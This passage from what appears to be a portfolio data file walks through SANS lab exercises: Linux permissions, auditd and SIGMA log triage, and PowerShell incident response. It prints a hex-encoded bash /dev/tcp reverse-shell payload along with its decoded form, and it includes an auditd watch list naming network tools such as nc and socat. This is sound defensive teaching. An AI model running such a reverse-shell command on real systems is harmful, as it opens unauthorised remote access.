        screenshot: "/labs/linux-perms-113302.png",
      },
      {
        title: "Sticky bit on /tmp",
        description:
          "Listed /tmp with ls -ld: drwxrwxrwt. The trailing t is the sticky bit, directory is world-writable, but only the file owner (or root) can rename or delete a file inside it. Created /tmp/sticky_bit_test.txt to demonstrate: any user can write to /tmp, but annika's file is protected from deletion by other users in the same container.",
        command: "ls -ld /tmp\necho \"only annika may rename or delete this file\" > /tmp/sticky_bit_test.txt\nls -l /tmp/sticky_bit_test.txt",
        commandBreakdown: "drwxrwxrwt: d=dir, rwx (user), rwx (group), rwt (other with sticky)\nt without x would display as T",
        screenshot: "/labs/linux-perms-113804.png",
      },
    ],
    outcome:
      "Walked through the full Linux permission model from first principles: default umask → file mode bits → tightened hardening umask → sticky-bit semantics on a shared directory. End state is a working mental model for why 644/755 is the default, why 640/750 is the hardened baseline, and why /tmp is drwxrwxrwt specifically.",
    nextStepsInProduction:
      "Set umask 0027 (or 0077 for single-tenant hosts) in /etc/login.defs and /etc/profile so it applies to every interactive session. For service accounts, set the umask in the systemd unit's UMask= directive so spawned processes inherit it. Audit existing sensitive paths (/etc, /var/log, /home) for world-readable files that shouldn't be, and confirm every world-writable directory on the filesystem has the sticky bit, find / -perm -0002 -type d ! -perm -1000 is the one-liner to enforce that.",
    securityControlsRelevant: [
      "CIS Linux benchmark: default umask 027",
      "File permission auditing (find -perm)",
      "Sticky bit on world-writable directories",
      "Service-account systemd UMask= hardening",
      "Group-based collaboration without world access",
    ],
    keyFindings: [
      "Default umask in the lab container is 0022, producing 644 files and 755 dirs",
      "umask 0027 produces 640 files and 750 dirs, world access eliminated",
      "/tmp has drwxrwxrwt, world-writable but protected by the sticky bit",
      "Group-readable mode (640) preserves same-group collaboration",
    ],
    takeaway: [
      "umask is the one Linux setting that silently shapes every file created on the system. Most hardening guides start with 027 without explaining why, the why is that 027 is the tightest mask that still permits same-group collaboration, and most systems have a legitimate reason to preserve group access (shared dev team, service account + admin group, etc.). 077 is tighter but breaks those workflows.",
      "The sticky bit is a good reminder that Unix permissions aren't just user/group/other, they're a small set of orthogonal tools, and the sticky bit is the one that makes shared directories safe. /tmp, /var/tmp, /dev/shm all rely on it. Any world-writable directory without the sticky bit is a finding worth chasing, because it means any user can delete or rename another user's files inside it.",
      "The docker-compose lab pattern here is understated but useful. You get a clean, throwaway environment for every permission exercise, no risk of clobbering your host, and the setup script handles the network and container lifecycle. Same pattern scales to reproducing customer bugs or running hostile code, it's the defensive version of the sandbox approach.",
    ],
    screenshots: [
      { src: "/labs/linux-perms-112203.png", alt: "Start lab container", caption: "start_6.1.sh brings up lab-61-permissions-1" },
      { src: "/labs/linux-perms-112213.png", alt: "Connect as annika", caption: "connect.sh drops into annika@container" },
      { src: "/labs/linux-perms-112304.png", alt: "Default umask file", caption: "test_perms.txt → 644 (umask 0022)" },
      { src: "/labs/linux-perms-113116.png", alt: "umask readout", caption: "umask → 0022" },
      { src: "/labs/linux-perms-113302.png", alt: "Tightened umask 0027", caption: "secure.txt 640, secure_dir 750" },
      { src: "/labs/linux-perms-113804.png", alt: "Sticky bit on /tmp", caption: "/tmp drwxrwxrwt + sticky_bit_test.txt" },
    ],
  },
  {
    id: 20,
    courseSlug: "sec401",
    slug: "linux-logging-auditing",
    title: "Linux Logging and Auditing",
    course: "SEC401 - Containers, Linux and Mac Security",
    role: "Solo, Lab",
    focus: "Linux Security",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized terminal screenshots from auditd, aureport, ausearch, and Zircolite SIGMA detection",
    context:
      "This lab walks the full Linux audit pipeline: an auditd rules file that watches recon/suspicious binaries, aureport/ausearch for querying audit.log, decoding a hex-encoded bash reverse shell, and finally running Zircolite with a SIGMA ruleset to surface 177 Webshell Remote Command Execution events from the same audit log.",
    summary:
      "Reviewed a Best-Practice auditd rules file (recon + susp_activity + sssd watches), ran aureport --summary to see 28 failed logins / 41020 events / 17 keys, used ausearch -k with -i for interpreted fields, decoded a hex-payload reverse shell to host.docker.internal:3869, and used Zircolite with alpha_rules_linux.json to detect a critical Webshell RCE pattern (177 events).",
    whyThisMatters:
      "Linux log triage is the #2 most-reported CyberLive skill on GSEC. Knowing aureport/ausearch flags by reflex, especially -k for keyed watches and -i for interpreted output, is the difference between answering a Linux forensics question in 30 seconds vs. burning 5 minutes on syntax.",
    tldr: [
      "auditd rules file watches recon (whoami/id/uname), suspicious binaries (nc/nmap/tcpdump/wget), and sssd execve",
      "aureport --summary + aureport --key --summary are the one-command triage views",
      "ausearch -k <key> -i retrieves keyed events with UIDs and timestamps resolved",
      "Zircolite with SIGMA rules found 177 Webshell RCE events in the same audit.log",
    ],
    skillsDemonstrated: [
      "Linux auditd rule authoring (-w / -a / -k / -F)",
      "aureport / ausearch log triage",
      "Decoding hex-encoded attacker payloads",
      "SIGMA ruleset execution with Zircolite",
      "MITRE ATT&CK mapping via SIGMA tags",
    ],
    tools: ["auditd", "aureport", "ausearch", "Zircolite", "SIGMA", "xxd", "gedit"],
    steps: [
      "Open /etc/audit/audit.rules (Florian Roth Best-Practice template) in gedit",
      "Review recon / susp_activity / sssd watch syntax",
      "aureport --summary for high-level event counts",
      "aureport --key --summary for keyed-rule breakdown",
      "xxd -r -p to decode a hex-encoded reverse shell payload",
      "ausearch --input audit.log -k sbin_susp",
      "ausearch -i to resolve UIDs and timestamps in-place",
      "zircolite --events audit.log --ruleset alpha_rules_linux.json --audit",
      "Review detected_events.json for SIGMA hits",
    ],
    stepDetails: [
      {
        title: "Open the auditd rules file",
        description:
          "Opened /sec401/labs/6.3/audit.rules with gedit, Florian Roth's Best-Practice auditd rules file, based on gov.uk auditd, CentOS 7 hardening, and linux-audit.com tuning guides.",
        command: "cd /sec401/labs/6.3\ngedit audit.rules &",
        screenshot: "/labs/linux-logging-124638.png",
      },
      {
        title: "Review recon / susp_activity / sssd rules",
        description:
          "Core audit patterns: -w <path> -p x -k <key> watches binaries for execution. Recon watches cover whoami, id, hostname, uname, /etc/issue. susp_activity covers wget, curl, base64, nc, netcat, ncat, ss, netstat, ssh, scp, sftp, ftp, socat, wireshark, tshark, rdesktop, xfreerdp, nmap. sssd block uses -a always,exit -F path=... -F perm=x -F auid>=500 to audit only real-user exec (auid>=500 excludes system accounts).",
        command: "# syntax shown:\n-w /usr/bin/whoami -p x -k recon\n-w /usr/bin/nc -p x -k susp_activity\n-a always,exit -F path=/usr/libexec/sssd/p11_child -F perm=x -F auid>=500 -F auid!=4294967295 -k T1078_Valid_Accounts",
        commandBreakdown: "-w: watch a path\n-p x: on execute (r/w/a/x for read/write/attr/exec)\n-k: key name (aureport/ausearch filter)\n-a always,exit: rule fires on syscall exit\n-F: field filter (perm, path, auid)\nauid!=4294967295: exclude unset audit UID",
        screenshot: "/labs/linux-logging-124837.png",
      },
      {
        title: "aureport --summary",
        description:
          "aureport --input ./audit.log --summary, high-level triage view of a captured audit log. 41020 events, 28 failed logins, 13 failed authentications, 72 commands, 50 executables, 83 files, 1544 failed syscalls, 17 keys, 21518 process IDs. Range Sep 28 2023 20:56 → Sep 29 14:23. This is the one-liner you run first to size the investigation.",
        command: "aureport --input ./audit.log --summary",
        commandBreakdown: "--input: read from a file instead of /var/log/audit/audit.log\n--summary: one-screen overview",
        screenshot: "/labs/linux-logging-124927.png",
      },
      {
        title: "aureport --key --summary",
        description:
          "Key-based breakdown of which audit rules fired most. network_socket_created 21638, detect_execve_www 14588, 'remote_shell' 3029, network_connect_4 880, susp_shell 162, etcpasswd 55, software_mgmt 37, network_connect_6 25, recon 24, session 21, systemd 16, Data_Compressed 8, specialfiles 7, susp_activity 4, string_search 2, anon_file_create 2, sbin_susp 1. This collapses 41k events into 17 focus areas.",
        command: "aureport --input audit.log --key --summary",
        screenshot: "/labs/linux-logging-125059.png",
      },
      {
        title: "Decode a hex-encoded reverse shell",
        description:
          "One of the audit events contained a hex-encoded command. Piped the hex string through xxd -r -p to decode: /usr/bin/bash -c (echo </dev/tcp/host.docker.internal/3869) 2>/dev/null, a classic bash /dev/tcp reverse shell testing an open port. Decoding hex-obfuscated payloads is a standard CyberLive skill.",
        command: "echo -n 2F7573722F62696E2F62617368002D6300286563686F203C2F6465762F7463702F686F73742E646F636B65722E696E7465726E616C2F333836392920323E2F6465762F6E756C6C2026 | xxd -r -p ; echo",
        commandBreakdown: "xxd -r -p: reverse hex to bytes, plain format (no line numbers)\n-n on echo: no trailing newline",
        screenshot: "/labs/linux-logging-125603.png",
      },
      {
        title: "ausearch by key",
        description:
          "ausearch --input audit.log -k sbin_susp, pulls every event with key sbin_susp. Output is the raw audit format: PROCTITLE, PATH, EXECVE, SYSCALL. Shows uid=33 (www-data) invoking /usr/sbin/tcpdump, the web server user spawning a packet sniffer, which is the whole point of the sbin_susp key.",
        command: "ausearch --input audit.log -k sbin_susp",
        commandBreakdown: "-k: filter by key (same name you set in the -k rule field)",
        screenshot: "/labs/linux-logging-125730.png",
      },
      {
        title: "ausearch -i for interpreted output",
        description:
          "Same query with -i. Now UIDs render as usernames (www-data instead of 33), timestamps render as human-readable (09/28/2023 20:56:15.474 instead of the 1695934575.474 unix timestamp), and arch shows x86_64. -i is the one flag that makes ausearch output actually readable under exam time pressure.",
        command: "ausearch --input audit.log -k sbin_susp -i",
        commandBreakdown: "-i: interpret numeric fields (uid/gid → name, epoch → date, syscall numbers → names)",
        screenshot: "/labs/linux-logging-125803.png",
      },
      {
        title: "Zircolite: SIGMA over audit.log",
        description:
          "zircolite --events audit.log --ruleset rules/alpha_rules_linux.json --audit, runs 169 SIGMA detection rules against the audit log. Finished in 13 seconds. Two hits: Webshell Remote Command Execution [critical] → 177 events, System Information Discovery - Auditd [low] → 11 events. Zircolite is the 'one command turns raw audit.log into SIEM-style alerts' tool.",
        command: "zircolite --events audit.log --ruleset rules/alpha_rules_linux.json --audit",
        commandBreakdown: "--events: input log (audit.log, evtx, sysmon)\n--ruleset: compiled SIGMA JSON\n--audit: tells Zircolite this is Linux auditd format",
        screenshot: "/labs/linux-logging-125927.png",
      },
      {
        title: "Review detected_events.json",
        description:
          "Zircolite wrote detected_events.json: title 'Webshell Remote Command Execution', id c0d3734d-330f-4a03-aae2-65dacc6a8222, rule_level critical, tags attack.persistence + attack.t1505.003, count 177. The underlying SIGMA query was SELECT * FROM logs WHERE type='SYSCALL' AND syscall='59' AND exe='/usr/bin/dash', execve of dash by the web server, which is the webshell signature.",
        command: "gedit detected_events.json &",
        screenshot: "/labs/linux-logging-130206.png",
      },
    ],
    outcome:
      "Demonstrated the full Linux detection pipeline from auditd rules → aureport/ausearch triage → hex-payload decode → SIGMA detection with Zircolite. End state: 41k events narrowed to 177 Webshell RCE alerts with MITRE ATT&CK T1505.003 mapping, all from standard Linux tooling.",
    nextStepsInProduction:
      "Ship audit.log into the SIEM (Splunk, Elastic) with key-based field extraction so analysts can pivot by recon / susp_activity / remote_shell without running ausearch on every host. Deploy Zircolite as a cron to produce detected_events.json per-host and forward the critical-rule hits into the ticketing system. Expand the rules file with MITRE-mapped keys (T1059, T1071, T1087) so every audit rule carries its own ATT&CK tag.",
    securityControlsRelevant: [
      "auditd with Best-Practice rules (Florian Roth template)",
      "aureport / ausearch for incident triage",
      "SIGMA rulesets + Zircolite for log → detection pipeline",
      "MITRE ATT&CK tagging on audit rule keys",
      "auid>=500 filter to exclude system-account noise",
    ],
    keyFindings: [
      "41020 audit events across Sep 28-29 2023 window",
      "28 failed logins + 13 failed authentications in the same window",
      "sbin_susp key: www-data (uid=33) spawning /usr/sbin/tcpdump",
      "Hex-decoded payload: bash /dev/tcp reverse shell to host.docker.internal:3869",
      "Zircolite SIGMA: 177 Webshell Remote Command Execution events (T1505.003 critical)",
    ],
    takeaway: [
      "The -k flag is the whole game with auditd. Without keys every rule blurs into one undifferentiated stream; with keys you get a tagged index (aureport --key --summary) that lets you pivot by attacker behavior instead of by syscall. Any production audit rule without a meaningful -k value is a rule that won't get queried.",
      "ausearch -i is the flag people forget under time pressure. Numeric UIDs and epoch timestamps are unreadable in a 5-minute CyberLive window. Train the muscle memory: ausearch -k <key> -i, always.",
      "Zircolite over audit.log is the shape of modern Linux detection. You keep auditd's low-level coverage but bolt on SIGMA's community detection library and MITRE mapping. That's the difference between 'I have logs' and 'I have alerts', and it's the answer to the inevitable audit finding that ships every SEC401 graduate into blue-team work.",
    ],
    screenshots: [
      { src: "/labs/linux-logging-124638.png", alt: "Open audit.rules", caption: "gedit audit.rules &: Best-Practice template" },
      { src: "/labs/linux-logging-124837.png", alt: "audit.rules content", caption: "recon + susp_activity + sssd watch rules" },
      { src: "/labs/linux-logging-124927.png", alt: "aureport --summary", caption: "41020 events, 28 failed logins, 17 keys" },
      { src: "/labs/linux-logging-125059.png", alt: "aureport --key --summary", caption: "Top keys: network_socket_created 21638, detect_execve_www 14588" },
      { src: "/labs/linux-logging-125603.png", alt: "xxd hex decode", caption: "Hex → bash /dev/tcp reverse shell to :3869" },
      { src: "/labs/linux-logging-125730.png", alt: "ausearch -k sbin_susp", caption: "www-data spawning /usr/sbin/tcpdump" },
      { src: "/labs/linux-logging-125803.png", alt: "ausearch -i interpreted", caption: "UIDs → names, epoch → human timestamps" },
      { src: "/labs/linux-logging-125927.png", alt: "Zircolite SIGMA run", caption: "169 rules → Webshell RCE critical (177 events)" },
      { src: "/labs/linux-logging-130206.png", alt: "detected_events.json", caption: "T1505.003, syscall=59, exe=/usr/bin/dash" },
    ],
  },
  {
    id: 21,
    courseSlug: "sec504",
    slug: "live-investigation-powershell",
    title: "PowerShell Live Investigation",
    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
    role: "Solo, Lab",
    focus: "Incident Response",
    level: "SEC504",
    date: "May 2026",
    artifacts: "Sanitized PowerShell console screenshots from a compromised Windows lab host (Sec504 workstation)",
    context:
      "This lab demonstrates the SEC504 live-investigation workflow on a Windows host: use PowerShell to enumerate processes, network connections, and registry persistence; identify a suspicious binary (calcache.exe) running from %TEMP% with a Run-key entry; eradicate the persistence; and then compare current services, scheduled tasks, and local users against a saved baseline to surface attacker artifacts.",
    summary:
      "Used PowerShell as a live-response tool against a compromised Sec504 lab host: pivoted from Get-Process to Get-NetTCPConnection to map calcache.exe (PID 1672) running from %TEMP% and beaconing to 23.11.32.159:80, stopped the process, removed its HKCU Run-key persistence and the binary itself, then ran Compare-Object against baseline service/scheduled-task snapshots to surface a rogue 'Dynamics' service and 'Microsoft eDynamics' scheduled task.",
    whyThisMatters:
      "When a Windows host is suspected of compromise, the first 30 minutes matter. PowerShell gives a responder one console that covers process triage, network state, registry inspection, and baseline diffing without installing a single third-party tool. Every cmdlet in this lab is something an attacker can also see and use, which is exactly why blue-team fluency in it is non-negotiable.",
    tldr: [
      "Found calcache.exe (PID 1672) running from %TEMP% via Where-Object -Property Path -Like *temp*",
      "Mapped its outbound connection to 23.11.32.159:80 with Get-NetTCPConnection",
      "Removed the HKCU Run-key persistence, killed the process, deleted the binary, then used Compare-Object to confirm the rogue 'Dynamics' service and 'Microsoft eDynamics' scheduled task",
    ],
    skillsDemonstrated: [
      "Live-response triage with PowerShell",
      "Process and network connection mapping (Get-Process, Get-NetTCPConnection)",
      "Registry persistence inspection (HKLM/HKCU Run keys)",
      "Persistence eradication (Remove-ItemProperty, Remove-Item, Stop-Process)",
      "Baseline diffing with Compare-Object",
    ],
    tools: ["PowerShell", "Get-Process", "Get-NetTCPConnection", "Compare-Object", "Registry triage"],
    steps: [
      "Run the lab setup script and baseline running processes: ./live-investigation-setup.ps1 then Get-Process",
      "Inspect a known-good process for context: Get-Process lsass | Select-Object -Property *",
      "Pivot to suspicious binaries via path filter: Get-Process | ... | Where-Object -Property Path -Like \"*temp*\"",
      "Map active TCP connections to process IDs: Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, State, OwningProcess",
      "Confirm and stop the malicious process: Get-Process | ... | Where-Object -Property Id -eq 1672 | Stop-Process",
      "Hunt for registry persistence under HKLM and HKCU CurrentVersion\\Run",
      "Eradicate persistence: Remove-ItemProperty on the Run key and Remove-Item on the binary",
      "Snapshot current services, scheduled tasks, and local users to files",
      "Diff snapshots against a saved baseline with Compare-Object to find adversary artifacts",
    ],
    stepDetails: [
      {
        title: "Stage the lab and baseline processes",
        description:
          "Ran the SEC504-provided setup script to prime the host with a simulated compromise, then dropped straight into Get-Process. The baseline output is the responder's first situational-awareness pass: every running process, with handles, working set, CPU seconds, and PID, in one screen.",
        command: "./live-investigation-setup.ps1\nGet-Process",
        screenshot: "/labs/live-investigation-102749.png",
      },
      {
        title: "Inspect a known-good process for shape",
        description:
          "Pulled the lsass process to anchor what a legitimate Windows process looks like: signed by Microsoft Corporation, path C:\\WINDOWS\\system32\\lsass.exe, FileVersion 10.0.19041.1586. Knowing the canonical shape of trusted processes is what lets you spot the outlier on the next pass.",
        command: "Get-Process lsass | Select-Object -Property *",
        commandBreakdown: "Select-Object -Property *: dump every property the process object exposes (Path, FileVersion, Company, ProductVersion, ...)",
        screenshot: "/labs/live-investigation-103301.png",
      },
      {
        title: "Narrow to Path, Name, Id",
        description:
          "Trimmed the projection to the three properties that matter for triage at scale: where it runs from, what it is called, and its PID. This is the projection used in every subsequent Where-Object filter.",
        command: "Get-Process lsass | Select-Object -Property Path, Name, Id",
        screenshot: "/labs/live-investigation-103423.png",
      },
      {
        title: "Find processes running out of TEMP",
        description:
          "Filtered the projection by path with -Like \"*temp*\". One hit: calcache.exe, PID 1672, running from C:\\Users\\Sec504\\AppData\\Local\\Temp\\calcache.exe. Anything executing from a user-writable Temp directory deserves the next five minutes of your attention.",
        command: "Get-Process | Select-Object -Property Path, Name, Id | Where-Object -Property Path -Like \"*temp*\"",
        commandBreakdown: "Where-Object: filter pipeline objects by a predicate\n-Property Path: the property to test\n-Like \"*temp*\": case-insensitive wildcard match",
        screenshot: "/labs/live-investigation-103828.png",
      },
      {
        title: "Enumerate active TCP connections",
        description:
          "Get-NetTCPConnection lists every listening, bound, and established TCP socket on the box. The raw output is busy: many Listen rows from system services, plus the established sessions that actually matter for incident response.",
        command: "Get-NetTCPConnection",
        screenshot: "/labs/live-investigation-103934.png",
      },
      {
        title: "Project the columns that map to OwningProcess",
        description:
          "Trimmed Get-NetTCPConnection to LocalAddress, LocalPort, State, OwningProcess. The Established rows are the lead: 192.168.182.132:1593 talking to 23.11.32.159:80 with OwningProcess 484, and 192.168.182.132:4444 listening under PID 1672 (calcache.exe). PID 1672 has a bound listener and an outbound to the same external IP, which is the canonical shape of a reverse-shell beacon.",
        command: "Get-NetTCPConnection | Select-Object -Property LocalAddress, LocalPort, State, OwningProcess",
        screenshot: "/labs/live-investigation-104118.png",
      },
      {
        title: "Confirm PID 1672 maps to calcache.exe",
        description:
          "Joined the two leads by filtering Get-Process on Id -eq 1672. Confirmed: PID 1672 is calcache.exe, sitting in %TEMP%, with a network footprint visible above. That is enough to act.",
        command: "Get-Process | Select-Object -Property Path, Name, Id | Where-Object -Property Id -eq 1672",
        screenshot: "/labs/live-investigation-104503.png",
      },
      {
        title: "Kill the malicious process",
        description:
          "Piped the same filter into Stop-Process to terminate calcache.exe. Pipelining the kill onto the filter is safer than typing the PID by hand, since the predicate guarantees you are stopping the right process even if PIDs have rolled.",
        command: "Get-Process | Select-Object -Property Path, Name, Id | Where-Object -Property Id -eq 1672 | Stop-Process",
        screenshot: "/labs/live-investigation-104553.png",
      },
      {
        title: "Browse the HKCU registry hive",
        description:
          "Get-ChildItem HKCU: lists the top-level keys under HKEY_CURRENT_USER (AppEvents, Console, Environment, Software, ...). PowerShell drives the registry like a filesystem, which is what makes registry triage scriptable.",
        command: "Get-ChildItem HKCU:",
        screenshot: "/labs/live-investigation-104759.png",
      },
      {
        title: "Hunt for Run-key persistence",
        description:
          "Read HKLM and HKCU CurrentVersion\\Run with Get-ItemProperty. HKLM looked clean (SecurityHealth, VMware User Process). HKCU contained the smoking gun: a Calcache value pointing to C:\\Users\\Sec504\\AppData\\Local\\Temp\\calcache.exe. Auto-run from a user-writable path is one of the most common persistence techniques and one of the easiest to spot once you know where to look.",
        command: "Get-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nGet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"",
        screenshot: "/labs/live-investigation-105049.png",
      },
      {
        title: "Eradicate the persistence and the binary",
        description:
          "Removed the Calcache value from HKCU Run, then deleted calcache.exe from %TEMP%. Removing the registry entry first matters: if you delete the binary first the entry still fires at next logon and the user gets a 'file not found' shell pop that tips off the attacker.",
        command: "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Calcache\"\nRemove-Item $env:temp\\calcache.exe",
        screenshot: "/labs/live-investigation-105459.png",
      },
      {
        title: "List the saved baseline",
        description:
          "The lab ships with a clean-state baseline under .\\baseline: services.txt, scheduledtasks.txt, localusers.txt. These are the 'before' snapshots that Compare-Object will diff against the current host.",
        command: "Get-ChildItem baseline",
        screenshot: "/labs/live-investigation-110358.png",
      },
      {
        title: "Snapshot services to a file",
        description:
          "Captured the current service inventory with Get-Service | Select-Object -ExpandProperty Name | Out-File services.txt. -ExpandProperty unwraps the Name property into a flat string list, which is the shape Compare-Object expects.",
        command: "Get-Service | Select-Object -ExpandProperty Name | Out-File services.txt",
        commandBreakdown: "Select-Object -ExpandProperty Name: flatten objects to a list of name strings\nOut-File: write the pipeline to a text file",
        screenshot: "/labs/live-investigation-110643.png",
      },
      {
        title: "Snapshot scheduled tasks and local users",
        description:
          "Did the same flatten-and-write pass for Get-ScheduledTask (TaskName) and Get-LocalUser (Name). Three files now describe the current host: services.txt, scheduledtasks.txt, localusers.txt.",
        command: "Get-ScheduledTask | Select-Object -ExpandProperty TaskName | Out-File scheduledtasks.txt\nGet-LocalUser | Select-Object -ExpandProperty Name | Out-File localusers.txt",
        screenshot: "/labs/live-investigation-110941.png",
      },
      {
        title: "Sanity-check the snapshot",
        description:
          "Get-Content -First 10 prints the first ten lines of services.txt. Visual sanity check before the diff, so you know the file actually captured service names and not, for example, a Format-Table header.",
        command: "Get-Content .\\services.txt -First 10",
        screenshot: "/labs/live-investigation-111020.png",
      },
      {
        title: "Load baseline and current snapshots into variables",
        description:
          "Stored the current and baseline service lists in $servicesnow and $servicebaseline. Variables make the next Compare-Object call readable.",
        command: "$servicesnow = Get-Content .\\services.txt\n$servicebaseline = Get-Content .\\baseline\\services.txt",
        screenshot: "/labs/live-investigation-111140.png",
      },
      {
        title: "Diff services against baseline",
        description:
          "Compare-Object surfaced one row: Dynamics, SideIndicator =>. The => arrow means 'present on the right side (current) but not on the left (baseline)'. A new service named Dynamics installed since the baseline was taken is exactly the kind of low-frequency, high-confidence signal a responder lives for.",
        command: "Compare-Object $servicebaseline $servicesnow",
        commandBreakdown: "Compare-Object: diff two object sets\nSideIndicator <=: only in reference (baseline)\nSideIndicator =>: only in difference (current)",
        screenshot: "/labs/live-investigation-111230.png",
      },
      {
        title: "Diff scheduled tasks against baseline",
        description:
          "Same pattern for Get-ScheduledTask: $schedulednow vs $Scheduledbaseline. Compare-Object returned 'Microsoft eDynamics' with SideIndicator =>. A rogue task named to look like a Microsoft component, paired with a rogue Dynamics service, is the persistence pattern operators use when they expect a defender to scan the names list and skim past anything that starts with 'Microsoft'.",
        command: "$schedulednow = Get-Content .\\scheduledtasks.txt\n$Scheduledbaseline = Get-Content .\\baseline\\scheduledtasks.txt\nCompare-Object $Scheduledbaseline $schedulednow",
        screenshot: "/labs/live-investigation-111723.png",
      },
    ],
    outcome:
      "Walked the full triage-to-eradication loop on a compromised Windows host with nothing but built-in PowerShell. Found calcache.exe running from %TEMP%, tied it to a beacon on 23.11.32.159:80, killed the process, removed its HKCU Run-key persistence and the binary, and confirmed two additional adversary artifacts (the Dynamics service and the Microsoft eDynamics scheduled task) by diffing against a baseline.",
    nextStepsInProduction:
      "Bake the baseline-and-diff pattern into a recurring job: snapshot services, scheduled tasks, local users, and Run-key contents on every endpoint nightly and store the artifacts centrally. Forward calcache.exe and its IOC set (filename, hash, parent path under %TEMP%, outbound to 23.11.32.159) into EDR allow/block lists and the SIEM watchlist. For containment, pair the PowerShell triage with Disable-NetAdapter or a network-isolation policy so the host can be quarantined without losing visibility for the responder.",
    securityControlsRelevant: [
      "Endpoint baselining (services, scheduled tasks, Run keys)",
      "Application control / WDAC denying execution from user-writable Temp directories",
      "PowerShell script-block logging and transcripts (Event IDs 4104, 4105)",
      "EDR with auto-isolation on outbound-beacon detection",
      "Privileged-account separation so a user-context Run key cannot escalate to LocalSystem",
    ],
    keyFindings: [
      "calcache.exe (PID 1672) running out of C:\\Users\\Sec504\\AppData\\Local\\Temp",
      "Outbound TCP from the host to 23.11.32.159:80 owned by PID 1672 / 484",
      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Calcache pointed at the Temp binary",
      "Baseline diff revealed a rogue 'Dynamics' service",
      "Baseline diff revealed a rogue 'Microsoft eDynamics' scheduled task",
    ],
    takeaway: [
      "Where-Object -Property Path -Like \"*temp*\" is the single most underrated triage filter on Windows. The vast majority of commodity malware lives in %TEMP%, %APPDATA%\\Local\\Temp, or %APPDATA%\\Roaming because those paths are user-writable without elevation. If you run that one filter every time you sit down at a suspect host, you will catch a meaningful fraction of attacks in under thirty seconds.",
      "The order of eradication matters more than people think. Remove the persistence registry value first, then kill the process, then delete the binary. If you reverse that order the Run-key still fires at next logon and creates a noisy 'file not found' shell that tips off the operator. The whole point of incident response is to keep the attacker from learning that you have learned about them.",
      "Compare-Object against a saved baseline is the closest thing to a free EDR you have on a fresh Windows install. It will not catch fileless or in-memory threats, but for the persistence-via-service and persistence-via-scheduled-task patterns that still dominate commodity intrusions, a nightly snapshot plus a morning diff is the highest-signal cheap detection you can run.",
    ],
    screenshots: [
      { src: "/labs/live-investigation-102749.png", alt: "Lab setup and Get-Process baseline", caption: "./live-investigation-setup.ps1 then Get-Process" },
      { src: "/labs/live-investigation-103059.png", alt: "Inspect lsass", caption: "Get-Process lsass: anchor what a clean process looks like" },
      { src: "/labs/live-investigation-103301.png", alt: "Lsass full property dump", caption: "Get-Process lsass | Select-Object -Property *" },
      { src: "/labs/live-investigation-103423.png", alt: "Projection to Path, Name, Id", caption: "Get-Process lsass | Select-Object -Property Path, Name, Id" },
      { src: "/labs/live-investigation-103656.png", alt: "Filter to explorer", caption: "Where-Object -Property Name -eq explorer" },
      { src: "/labs/live-investigation-103828.png", alt: "Filter to TEMP paths", caption: "Where-Object -Property Path -Like \"*temp*\" surfaces calcache.exe (PID 1672)" },
      { src: "/labs/live-investigation-103934.png", alt: "Get-NetTCPConnection", caption: "Raw TCP connection table" },
      { src: "/labs/live-investigation-104118.png", alt: "Projected TCP connection table", caption: "Established 192.168.182.132 → 23.11.32.159:80 (OwningProcess 484); listener :4444 owned by PID 1672" },
      { src: "/labs/live-investigation-104503.png", alt: "Confirm PID 1672", caption: "Get-Process | Where-Object -Property Id -eq 1672 → calcache.exe" },
      { src: "/labs/live-investigation-104553.png", alt: "Stop-Process", caption: "Pipelined kill of PID 1672" },
      { src: "/labs/live-investigation-104759.png", alt: "HKCU root keys", caption: "Get-ChildItem HKCU:: registry hives drive like a filesystem" },
      { src: "/labs/live-investigation-105049.png", alt: "Run-key persistence", caption: "HKCU Run\\Calcache → %TEMP%\\calcache.exe" },
      { src: "/labs/live-investigation-105459.png", alt: "Eradicate persistence", caption: "Remove-ItemProperty then Remove-Item: registry first, binary second" },
      { src: "/labs/live-investigation-110358.png", alt: "Baseline files", caption: ".\\baseline contains services, scheduled tasks, and local user snapshots" },
      { src: "/labs/live-investigation-110643.png", alt: "Snapshot services", caption: "Get-Service | Select-Object -ExpandProperty Name | Out-File services.txt" },
      { src: "/labs/live-investigation-110941.png", alt: "Snapshot scheduled tasks and users", caption: "Out-File scheduledtasks.txt and localusers.txt" },
      { src: "/labs/live-investigation-111020.png", alt: "Sanity-check services.txt", caption: "Get-Content -First 10" },
      { src: "/labs/live-investigation-111140.png", alt: "Load snapshots into variables", caption: "$servicesnow and $servicebaseline" },
      { src: "/labs/live-investigation-111230.png", alt: "Diff services", caption: "Compare-Object: rogue 'Dynamics' service flagged with SideIndicator =>" },
      { src: "/labs/live-investigation-111452.png", alt: "Scheduled task enum", caption: "Get-ScheduledTask raw output" },
      { src: "/labs/live-investigation-111723.png", alt: "Diff scheduled tasks", caption: "Compare-Object: rogue 'Microsoft eDynamics' scheduled task flagged" },
    ],
  },
  {
    id: 22,
    courseSlug: "sec504",
    slug: "rita-beacon-detection",
    title: "Network Beacon Detection with RITA",
    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
    role: "Solo, Lab",
    focus: "Threat Hunting",
    level: "SEC504",
    date: "May 2026",
    artifacts: "Sanitized RITA UI, Zeek log, and config.hjson screenshots from the SEC504 falsimentis dataset",
    context:
      "This lab demonstrates the SEC504 network-threat-hunting workflow with RITA (Real Intelligence Threat Analytics) by Active Countermeasures. Import a week of Zeek logs from the falsimentis dataset, triage RITA's beacon-scored output, tune false positives via the CIDR safelist, wire in a threat-intel feed, then re-import to surface real C2 traffic disguised as Google Analytics.",
    summary:
